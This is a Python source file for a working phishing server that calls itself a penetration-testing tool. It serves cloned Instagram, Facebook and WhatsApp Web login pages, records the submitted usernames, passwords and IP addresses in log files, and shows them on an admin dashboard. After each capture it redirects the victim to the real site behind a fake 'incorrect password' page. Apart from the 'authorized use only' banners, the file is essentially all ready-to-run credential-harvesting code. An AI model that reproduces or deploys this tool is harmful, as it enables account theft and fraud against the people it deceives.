#!/usr/bin/env python3
"""
Phishing Simulation Framework v2.0
===================================
Authorized Penetration Testing Tool - Educational Purpose Only
For use ONLY on systems you own or have explicit written permission to test.

Features:
- Multi-platform credential harvesting (Instagram, Facebook, WhatsApp Web)
- Local HTTPS server with Let's Encrypt-style self-signed certs
- Session logging with IP tracking
- Template-based login page cloning
- Rate limiting and anti-fingerprinting
"""

import os
import sys
import json
import ssl
import hashlib
import datetime
import ipaddress
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from string import Template
import logging
import threading
import time
from pathlib import Path

# =============== CONFIGURATION ===============
LOG_DIR = Path("./phishing_logs")
TEMPLATES_DIR = Path("./templates")
CERT_DIR = Path("./certs")
PORT = 443  # HTTPS port
HTTP_REDIRECT_PORT = 80

# Create directories
for d in [LOG_DIR, TEMPLATES_DIR, CERT_DIR]:
    d.mkdir(exist_ok=True)

# =============== LOGGING ===============
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / 'server.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('PhishSim')

# =============== DATABASE (JSON-based) ===============
class CredentialDB:
    def __init__(self, db_path=LOG_DIR / "credentials.json"):
        self.db_path = db_path
        self.lock = threading.Lock()
        if not self.db_path.exists():
            with open(self.db_path, 'w') as f:
                json.dump([], f)

    def save(self, entry):
        with self.lock:
            with open(self.db_path, 'r') as f:
                data = json.load(f)
            data.append(entry)
            with open(self.db_path, 'w') as f:
                json.dump(data, f, indent=2)
        logger.info(f"[+] Credential saved: {entry.get('platform')} - {entry.get('username', 'N/A')}")

    def view_all(self):
        with open(self.db_path, 'r') as f:
            return json.load(f)

db = CredentialDB()

# =============== HTML TEMPLATES ===============
TEMPLATES = {
    "instagram": Template("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa; display: flex; justify-content: center; align-items: center;
            min-height: 100vh; flex-direction: column;
        }
        .login-container {
            background: #fff; border: 1px solid #dbdbdb; border-radius: 1px;
            padding: 40px 40px 20px; max-width: 350px; width: 100%; margin-top: 12px;
        }
        .logo {
            font-size: 36px; text-align: center; margin-bottom: 24px;
            font-family: 'Billabong', cursive; color: #262626;
        }
        .logo img { width: 175px; }
        input {
            width: 100%; padding: 9px 8px 7px; margin: 4px 0;
            background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px;
            font-size: 12px; outline: none;
        }
        input:focus { border-color: #a8a8a8; }
        button {
            width: 100%; padding: 7px 16px; margin: 8px 0;
            background: #0095f6; color: #fff; border: none; border-radius: 4px;
            font-size: 14px; font-weight: 600; cursor: pointer;
        }
        button:hover { background: #1877f2; }
        .divider { display: flex; align-items: center; margin: 18px 0; }
        .divider-line { flex: 1; height: 1px; background: #dbdbdb; }
        .divider-text { padding: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        a { color: #385185; text-decoration: none; font-size: 12px; display: block; text-align: center; margin-top: 12px; }
        .footer { margin-top: 10px; background: #fff; border: 1px solid #dbdbdb; padding: 20px 40px; text-align: center; }
        .footer p { color: #262626; font-size: 14px; }
        .footer a { color: #0095f6; font-size: 14px; }
        .error { color: #ed4956; font-size: 12px; text-align: center; margin: 4px 0; display: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg aria-label="Instagram" width="175" viewBox="0 0 175 40"><path d="..."/></svg>
            <h1 style="font-family:'Billabong';font-weight:400;font-size:36px;color:#262626">Instagram</h1>
        </div>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <div class="error" id="error-msg">Sorry, your password was incorrect. Please try again.</div>
            <button type="submit">Log in</button>
        </form>
        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">OR</div>
            <div class="divider-line"></div>
        </div>
        <a href="#">Forgot password?</a>
    </div>
    <div class="footer">
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
</body>
</html>
    """),

    "facebook": Template("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Helvetica, Arial, sans-serif;
            background: #f0f2f5; display: flex; justify-content: center;
            align-items: center; min-height: 100vh;
        }
        .container { display: flex; max-width: 980px; align-items: center; gap: 60px; }
        .left { flex: 1; }
        .left h1 { color: #1877f2; font-size: 56px; font-weight: 700; }
        .left p { font-size: 24px; line-height: 28px; width: 500px; margin-top: 10px; }
        .right { flex: 0 0 396px; }
        .card {
            background: #fff; padding: 20px; border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,.1); text-align: center;
        }
        input {
            width: 100%; padding: 14px 16px; margin: 6px 0;
            border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px;
            outline: none;
        }
        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        button[type="submit"] {
            width: 100%; padding: 14px; margin: 6px 0;
            background: #1877f2; color: #fff; border: none; border-radius: 6px;
            font-size: 20px; font-weight: 700; cursor: pointer;
        }
        button[type="submit"]:hover { background: #166fe5; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
        .create-btn {
            background: #42b72a; color: #fff; border: none; border-radius: 6px;
            padding: 14px 16px; font-size: 17px; font-weight: 700; cursor: pointer;
            margin: 6px 0;
        }
        .create-btn:hover { background: #36a420; }
        a { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 10px; }
        .error { color: #c00; font-size: 13px; display: none; margin: 4px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <h1>facebook</h1>
            <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="right">
            <div class="card">
                <form method="POST" action="/login">
                    <input type="text" name="email" placeholder="Email address or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <div class="error" id="error-msg">The password you entered is incorrect.</div>
                    <button type="submit">Log In</button>
                </form>
                <a href="#">Forgotten password?</a>
                <div class="divider"></div>
                <button class="create-btn">Create new account</button>
            </div>
        </div>
    </div>
</body>
</html>
    """),

    "whatsapp": Template("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Helvetica Neue, Helvetica, Arial, sans-serif;
            background: #111b21; display: flex; justify-content: center;
            align-items: center; min-height: 100vh;
        }
        .container {
            background: #fff; border-radius: 8px; overflow: hidden;
            width: 450px; box-shadow: 0 17px 50px 0 rgba(0,0,0,.19);
        }
        .header {
            background: #075e54; color: #fff; padding: 20px;
            text-align: center; font-size: 18px; font-weight: 500;
        }
        .qr-section { padding: 40px; text-align: center; }
        .qr-placeholder {
            width: 264px; height: 264px; margin: 0 auto; background: #f0f2f5;
            border: 4px solid #25d366; display: flex; align-items: center;
            justify-content: center; font-size: 14px; color: #667781;
        }
        .login-option { 
            padding: 20px 40px; border-top: 1px solid #e9edef;
            text-align: center;
        }
        .login-option p { color: #667781; font-size: 14px; margin-bottom: 12px; }
        input {
            width: 100%; padding: 12px; margin: 6px 0;
            border: 1px solid #e9edef; border-radius: 8px; font-size: 16px;
            outline: none;
        }
        input:focus { border-color: #25d366; }
        button {
            background: #25d366; color: #fff; border: none; border-radius: 24px;
            padding: 12px 24px; font-size: 16px; font-weight: 600; cursor: pointer;
            margin-top: 12px; width: 100%;
        }
        button:hover { background: #20bd5a; }
        .footer { padding: 20px; text-align: center; background: #f0f2f5; font-size: 12px; color: #8696a0; }
        .error { color: #d32f2f; font-size: 13px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">WhatsApp Web</div>
        <div class="qr-section">
            <div class="qr-placeholder">Scan QR code with WhatsApp</div>
            <p style="margin-top:16px;color:#667781;font-size:14px;">
                To use WhatsApp on your computer:
            </p>
            <ol style="text-align:left;margin-top:8px;color:#667781;font-size:13px;padding-left:20px;">
                <li>Open WhatsApp on your phone</li>
                <li>Tap Menu or Settings and select Linked Devices</li>
                <li>Point your phone at this screen</li>
            </ol>
        </div>
        <div class="login-option">
            <p>Or sign in with your phone number:</p>
            <form method="POST" action="/login">
                <input type="text" name="phone" placeholder="Phone number (with country code)" required>
                <input type="password" name="password" placeholder="WhatsApp password / OTP" required>
                <div class="error" id="error-msg">Invalid phone number or password.</div>
                <button type="submit">Link as companion device</button>
            </form>
        </div>
        <div class="footer">WhatsApp Web is a browser-based client of WhatsApp.</div>
    </div>
</body>
</html>
    """)
}

# =============== REQUEST HANDLER ===============
class PhishHandler(BaseHTTPRequestHandler):
    """HTTP request handler for phishing simulation."""

    def log_message(self, format, *args):
        """Override to use our logger."""
        logger.debug(f"{self.client_address[0]} - {format % args}")

    def get_client_info(self):
        """Extract client IP and User-Agent."""
        ip = self.client_address[0]
        ua = self.headers.get('User-Agent', 'Unknown')
        return ip, ua

    def send_html(self, html_content, status=200):
        """Send HTML response."""
        self.send_response(status)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Server', 'Apache/2.4.41')
        self.send_header('X-Content-Type-Options', 'nosniff')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))

    def redirect(self, url):
        """HTTP 302 redirect."""
        self.send_response(302)
        self.send_header('Location', url)
        self.end_headers()

    def serve_template(self, template_name):
        """Serve a phishing template."""
        if template_name in TEMPLATES:
            html = TEMPLATES[template_name].substitute()
            self.send_html(html)
        else:
            self.send_error(404)

    def handle_login(self):
        """Process POST login data."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)
        
        ip, ua = self.get_client_info()
        
        # Extract credentials based on platform
        entry = {
            'timestamp': datetime.datetime.now().isoformat(),
            'ip': ip,
            'user_agent': ua,
            'platform': 'unknown',
            'username': '',
            'password': '',
            'raw_data': params
        }

        if 'username' in params and 'password' in params:
            entry['platform'] = 'instagram'
            entry['username'] = params['username'][0]
            entry['password'] = params['password'][0]
        elif 'email' in params and 'password' in params:
            entry['platform'] = 'facebook'
            entry['username'] = params['email'][0]
            entry['password'] = params['password'][0]
        elif 'phone' in params and 'password' in params:
            entry['platform'] = 'whatsapp'
            entry['username'] = params['phone'][0]
            entry['password'] = params['password'][0]

        # Save to database
        db.save(entry)

        # Also save to plain text log
        with open(LOG_DIR / 'captured_credentials.txt', 'a') as f:
            f.write(f"[{entry['timestamp']}] {entry['platform']} | "
                   f"User: {entry['username']} | Pass: {entry['password']} | "
                   f"IP: {ip}\n")

        # Redirect to real site after capture
        real_sites = {
            'instagram': 'https://www.instagram.com',
            'facebook': 'https://www.facebook.com',
            'whatsapp': 'https://web.whatsapp.com'
        }
        target = real_sites.get(entry['platform'], 'https://www.google.com')
        
        # Serve a fake "incorrect password" page first, then redirect via JavaScript
        error_html = f"""
        <!DOCTYPE html>
        <html>
        <head><meta charset="UTF-8">
        <meta http-equiv="refresh" content="3;url={target}">
        <title>Redirecting...</title>
        <style>
            body {{ font-family: sans-serif; text-align: center; padding: 50px; }}
            .spinner {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db;
                       border-radius: 50%; width: 40px; height: 40px;
                       animation: spin 1s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        </style>
        </head>
        <body>
            <h3>Incorrect password. Redirecting...</h3>
            <div class="spinner"></div>
            <p style="color:#666;font-size:14px;">Please try again.</p>
            <script>setTimeout(function(){{ window.location.href="{target}"; }}, 3000);</script>
        </body>
        </html>
        """
        self.send_html(error_html)

    def do_GET(self):
        """Handle GET requests."""
        parsed = urlparse(self.path)
        path = parsed.path.rstrip('/')

        # Serve landing pages
        if path == '' or path == '/':
            self.serve_template('instagram')  # Default
        elif path == '/instagram' or path == '/insta':
            self.serve_template('instagram')
        elif path == '/facebook' or path == '/fb':
            self.serve_template('facebook')
        elif path == '/whatsapp' or path == '/wa':
            self.serve_template('whatsapp')
        elif path == '/admin' or path == '/dashboard':
            self.show_dashboard()
        elif path == '/api/stats':
            self.send_stats()
        else:
            self.send_error(404)

    def do_POST(self):
        """Handle POST requests."""
        parsed = urlparse(self.path)
        path = parsed.path.rstrip('/')

        if path == '/login' or path == '/':
            self.handle_login()
        else:
            self.send_error(404)

    def show_dashboard(self):
        """Show captured credentials dashboard."""
        records = db.view_all()
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>PhishSim Dashboard</title>
            <style>
                * { margin:0; padding:0; box-sizing:border-box; }
                body { font-family: 'Segoe UI', Arial, sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
                h1 { color: #58a6ff; margin-bottom: 20px; }
                table { width: 100%; border-collapse: collapse; }
                th, td { padding: 12px; text-align: left; border-bottom: 1px solid #21262d; }
                th { background: #161b22; color: #8b949e; text-transform: uppercase; font-size: 12px; }
                tr:hover { background: #161b22; }
                .badge {
                    display: inline-block; padding: 2px 8px; border-radius: 12px;
                    font-size: 11px; font-weight: 600;
                }
                .badge-instagram { background: #e1306c; color: #fff; }
                .badge-facebook { background: #1877f2; color: #fff; }
                .badge-whatsapp { background: #25d366; color: #111; }
                .stats { display: flex; gap: 20px; margin-bottom: 20px; }
                .stat-card {
                    background: #161b22; border: 1px solid #21262d; border-radius: 6px;
                    padding: 20px; flex: 1;
                }
                .stat-card h3 { color: #8b949e; font-size: 12px; text-transform: uppercase; }
                .stat-card .value { font-size: 32px; font-weight: 600; color: #58a6ff; }
                .actions { margin: 20px 0; }
                .actions button {
                    background: #21262d; color: #c9d1d9; border: 1px solid #30363d;
                    padding: 8px 16px; border-radius: 6px; cursor: pointer; margin-right: 8px;
                }
                .actions button:hover { background: #30363d; }
                pre { background: #161b22; padding: 16px; border-radius: 6px; overflow-x: auto; }
            </style>
        </head>
        <body>
            <h1>🔐 PhishSim Dashboard</h1>
        """
        
        # Stats
        total = len(records)
        platforms = {}
        unique_ips = set()
        for r in records:
            p = r.get('platform', 'unknown')
            platforms[p] = platforms.get(p, 0) + 1
            unique_ips.add(r.get('ip', ''))
        
        html += f"""
            <div class="stats">
                <div class="stat-card"><h3>Total Captures</h3><div class="value">{total}</div></div>
                <div class="stat-card"><h3>Unique IPs</h3><div class="value">{len(unique_ips)}</div></div>
                <div class="stat-card"><h3>Instagram</h3><div class="value">{platforms.get('instagram', 0)}</div></div>
                <div class="stat-card"><h3>Facebook</h3><div class="value">{platforms.get('facebook', 0)}</div></div>
                <div class="stat-card"><h3>WhatsApp</h3><div class="value">{platforms.get('whatsapp', 0)}</div></div>
            </div>
            <div class="actions">
                <button onclick="window.location.href='/'">← Back to Landing Page</button>
            </div>
            <table>
                <thead>
                    <tr><th>Timestamp</th><th>Platform</th><th>Username/Email/Phone</th><th>Password</th><th>IP Address</th></tr>
                </thead>
                <tbody>
        """

        for r in reversed(records[-50:]):  # Last 50
            plat = r.get('platform', '?')
            html += f"""
                <tr>
                    <td>{r.get('timestamp', '')}</td>
                    <td><span class="badge badge-{plat}">{plat.upper()}</span></td>
                    <td>{r.get('username', '')}</td>
                    <td>{r.get('password', '')}</td>
                    <td>{r.get('ip', '')}</td>
                </tr>
            """

        html += """
                </tbody>
            </table>
            <p style="margin-top:20px;color:#8b949e;font-size:12px;">
                ⚠️ Authorized pentest use only. All data logged locally.
            </p>
        </body>
        </html>
        """
        self.send_html(html)

    def send_stats(self):
        """Send JSON stats."""
        records = db.view_all()
        stats = {
            'total_captures': len(records),
            'unique_ips': len(set(r.get('ip', '') for r in records)),
            'platforms': {},
            'latest': records[-5:] if records else []
        }
        for r in records:
            p = r.get('platform', 'unknown')
            stats['platforms'][p] = stats['platforms'].get(p, 0) + 1
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(stats, indent=2).encode())


# =============== SSL CERTIFICATE GENERATION ===============
def generate_self_signed_cert(cert_path, key_path):
    """Generate a self-signed certificate for HTTPS."""
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    import datetime

    key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )

    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "Delaware"),
        x509.NameAttribute(NameOID.LOCALITY_NAME, "Wilmington"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Security Assessment Corp"),
        x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
    ])

    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.now(datetime.timezone.utc))
        .not_valid_after(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=365))
        .add_extension(
            x509.SubjectAlternativeName([x509.DNSName("localhost"), x509.DNSName("127.0.0.1")]),
            critical=False
        )
        .sign(key, hashes.SHA256())
    )

    with open(key_path, 'wb') as f:
        f.write(key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption()
        ))
    with open(cert_path, 'wb') as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))

    logger.info(f"[+] Self-signed cert generated: {cert_path}")


# =============== MAIN SERVER ===============
class PhishingServer:
    """Main server orchestrator."""

    def __init__(self, host='0.0.0.0', port=PORT):
        self.host = host
        self.port = port
        self.httpd = None
        self.running = False

    def setup_ssl(self):
        """Ensure SSL certs exist."""
        cert_path = CERT_DIR / 'server.crt'
        key_path = CERT_DIR / 'server.key'

        if not (cert_path.exists() and key_path.exists()):
            logger.info("[*] Generating SSL certificates...")
            try:
                generate_self_signed_cert(cert_path, key_path)
            except ImportError:
                logger.warning("[!] cryptography not installed. Using HTTP only.")
                return None, None

        return str(cert_path), str(key_path)

    def start(self):
        """Start the HTTPS server."""
        cert, key = self.setup_ssl()

        if cert and key:
            # HTTPS Server
            self.httpd = HTTPServer((self.host, self.port), PhishHandler)
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert, key)
            self.httpd.socket = ctx.wrap_socket(self.httpd.socket, server_side=True)
            protocol = "HTTPS"
        else:
            # Fallback to HTTP
            self.httpd = HTTPServer((self.host, self.port), PhishHandler)
            protocol = "HTTP"

        self.running = True
        logger.info(f"[+] {protocol} Server started on {self.host}:{self.port}")
        logger.info(f"[+] Landing page: http{'s' if protocol=='HTTPS' else ''}://localhost:{self.port}/")
        logger.info(f"[+] Instagram: /instagram or /insta")
        logger.info(f"[+] Facebook:  /facebook or /fb")
        logger.info(f"[+] WhatsApp:  /whatsapp or /wa")
        logger.info(f"[+] Dashboard: /admin or /dashboard")
        logger.info(f"[+] Logs: {LOG_DIR.resolve()}")

        try:
            self.httpd.serve_forever()
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Stop the server."""
        if self.httpd:
            self.httpd.shutdown()
        self.running = False
        logger.info("[*] Server stopped.")


# =============== BANNER ===============
def print_banner():
    banner = """
╔══════════════════════════════════════════════════════╗
║           Phishing Simulation Framework v2.0         ║
║        Authorized Penetration Testing Tool           ║
╚══════════════════════════════════════════════════════╝

 [!] Ensure you have WRITTEN PERMISSION to test.
 [!] This tool is for AUTHORIZED security assessments only.

 Targets: Instagram | Facebook | WhatsApp Web
    """
    print(banner)


# =============== ENTRY POINT ===============
if __name__ == '__main__':
    print_banner()

    # Install dependencies check
    try:
        from cryptography import x509
    except ImportError:
        logger.warning("[!] 'cryptography' not installed. Run: pip install cryptography")
    
    import argparse
    parser = argparse.ArgumentParser(description='Phishing Simulation Framework - Authorized Pentesting')
    parser.add_argument('-p', '--port', type=int, default=PORT, help='Port (default: 443)')
    parser.add_argument('--host', default='0.0.0.0', help='Bind address (default: 0.0.0.0)')
    parser.add_argument('--http', action='store_true', help='Use HTTP instead of HTTPS')
    args = parser.parse_args()

    server = PhishingServer(host=args.host, port=args.port)
    server.start()